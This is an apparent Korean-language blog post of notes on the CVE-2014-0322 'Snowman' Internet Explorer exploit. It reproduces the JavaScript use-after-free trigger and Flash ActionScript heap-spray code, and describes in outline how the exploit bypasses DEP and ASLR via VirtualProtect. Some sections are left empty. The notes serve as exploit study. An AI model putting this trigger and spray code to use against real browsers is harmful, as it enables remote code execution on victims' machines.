---
layout: post
title: "CVE-2014-0322 'Snowman' exploit"
date: 2014-05-10 01:12:08 +0900
comments: true
categories: 
---

[CVE-2014-0322 'Snowman' exploit](http://hdwsec.fr/blog/CVE-2014-0322.html)

crash 를 유발하는 JS.

    <script>
        function dword2data(dword) {
            var d = Number(dword).toString(16);
            while (d.length < 8)
                d = '0' + d;
            return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
        }
     
     
        var g_arr = [];
        var arrLen = 0x250;
     
        function fun() {
     
            var a = 0;
            for (a = 0; a < arrLen; ++a) {
                g_arr[a] = document.createElement('div')
            }
             
            var b = dword2data(0xdeadc0de);
            var c = 0x1a1b2000;
            while (b.length < 0x360) {
                b += dword2data(0x1a1b2000)
            }
                     
            var d = b.substring(0, (0x340 - 2) / 2);
            try {
                this.outerHTML = this.outerHTML
            } catch (e) {}
             
            CollectGarbage();
     
            for (a = 0; a < arrLen; ++a) {
                g_arr[a].title = d.substring(0, d.length);
            }
        }
     
        function puIHa3() {
            var a = document.getElementsByTagName("script");
            var b = a[0];
            b.onpropertychange = fun;
            var e = document.createElement('SELECT');
            e = b.appendChild(e);
        }
                 
        puIHa3();
    </script>

Flash 에서 heap 을 할당하고, initialize 하고, `ExternalInterface.call()` 로 JavaScript function 을 호출한다. JavaScript function 에서는 use-after-free 를 발생시킨다. Flash timer handler 에서 할당된 heap 을 모니터하며 corruption 이 발생했는지를 주기적으로 감시한다. corrupt condition 이 발견되면 VirtualProtect 와 stack pivot 정보를 찾아 DEP / ASLR 을 바이패스하는 payload 를 만들어 수행시킨다.

### Heap Spraying

    <Object> 를 96 * 1024 (0x18180 == 98688) 개 할당한다.
    각각 s[0] ~ s[0x18180 - 1] 마다 Vector.<uint>(1024 - 16) 를 할당하고, 

    public function init_heap():void
    {
        var len:int = 0;
        var i:int = 0;

        /* Spray the integer vectors */
        this.s = new Vector.<Object>(0x18180);
        whlie (len < 0x18180)
        {
            this.s[len] = new Vector.<uint>(0x1000 / 4 - 16);
            for (i = 0; i < this.s[len].length; i++)
            {
                this.s[len][i] = 0x1a1a1a1a;
            }
            ++len;
        }

        /* Spray sound object ptr */
        this.sound = new Sound();
        this.spraysound = new Vector.<Object>(0x100);

        len = 0;
        while (len < 0x100)
        {
            this.spraysound[len] = new Vector.<Object>(0x1234);
            for (i = 0; i < this.spraysound[len].length; i++)
            {
                this.spraysound[len][i] = this.sound;
            }
            ++len;
        }
    }

### JavaScript use-after-free

### DEP bypass

    BOOL WINAPI VirtualProtect(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flNewProtect,
        PDWORD lpflOldProtect
    );

    BOOL WINAPI VirtualProtectEx(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flNewProtect,
        PDWORD lpflOldProtect
    );

    lpAddress [in]
    보호 특성을 변경할 가상 메모리의 기준 주소에 대한 포인터입니다.

    dwSize [in]
    변경할 메모리 페이지 영역의 크기(바이트)입니다.

    flNewProtect [in]
    적용할 메모리 보호 형식입니다.

    pflOldProtect [out]
    이전 메모리 보호 값에 대한 포인터입니다.
